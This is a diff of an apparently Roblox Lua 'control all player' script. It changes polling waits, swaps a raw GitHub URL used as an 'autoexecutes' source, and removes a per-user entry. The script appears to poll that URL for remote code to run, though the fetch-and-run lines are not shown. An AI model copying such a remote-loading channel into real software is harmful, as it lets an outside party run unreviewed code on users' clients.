@@ -1,4 +1,4 @@
----------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------
 
 -- control all player
 
@@ -34,7 +34,7 @@ task.spawn(function()
             end)
         end
         
-        task.wait()
+        task.wait(3)
     end
 end)
 
@@ -71,7 +71,7 @@ end)
 
 
 
-local autoexecutes = "https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/all_plyer_control.lua"
+local autoexecutes = "https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/auto_execute_player.lua"
 
 local lastContent1 = ""
 
@@ -91,16 +91,9 @@ task.spawn(function()
             end)
         end
         
-        task.wait()
+        task.wait(3)
     end
 end)
-
-
-
-
-
-
-
 
 
 
@@ -263,7 +256,7 @@ end,
 
 
 
-----------------------------------------------------------------
+--------------------------------------------------
 
 -- enzo
 
@@ -273,36 +266,6 @@ end,
 print("lil phonk")
 
 end,
-
-}
-
-
-
-
-
-if Playercontrol[LocalPlayer.UserId] then
-    task.spawn(Playercontrol[LocalPlayer.UserId])
-end
-
-
----------------------------------------------------------------
-
--- kyle
-
-
-
-
-
-
-
-[11606589082] = function()  -- makers676167
-
-print("lil phonk123")
-
-end,
-
-
-
 
 
 
@@ -330,3 +293,14 @@ end
 
 
 ---------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
